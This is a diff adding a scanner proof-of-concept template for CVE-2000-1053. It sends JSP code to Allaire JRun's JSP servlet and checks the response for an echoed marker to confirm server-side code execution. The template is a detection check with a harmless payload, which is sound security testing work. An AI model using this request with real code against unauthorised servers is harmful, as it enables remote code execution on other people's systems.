@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "Allaire JRun 2.3.3 的 com.livesoftware.jrun.plugins.JSP Servlet 在编译处理 JSP 代码时未对用户输入进行充分过滤与校验，远程攻击者可通过跨站脚本（CSS）攻击向服务器提交特制 JSP 代码并直接调用该 Servlet 使其在服务端被编译执行，从而实现对受影响服务器的任意代码执行。该 PoC 通过 HTTP 请求向目标 Servlet 提交恶意 JSP 代码并检查服务端是否回显执行结果，无破坏性，仅用于安全验证。"
+id = "POC-AVE-2000-0764"
+name = "CVE-2000-1053 Allaire JRun 2.3.3 JSP Servlet 任意代码执行 PoC"
+severity = "critical"
+tags = [
+    "cve-2000-1053",
+    "jrun",
+    "jsp",
+    "rce",
+]
+vuln_id = [
+    "CVE-2000-1053",
+    "AVE-2000-0764",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/servlet/com.livesoftware.jrun.plugins.JSP/servlet.jsp"
+protocol = "http"
+
+[poc.requests.body]
+content = '<%out.println("AVE_CVE_2000_1053");%>'
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_CVE_2000_1053"]
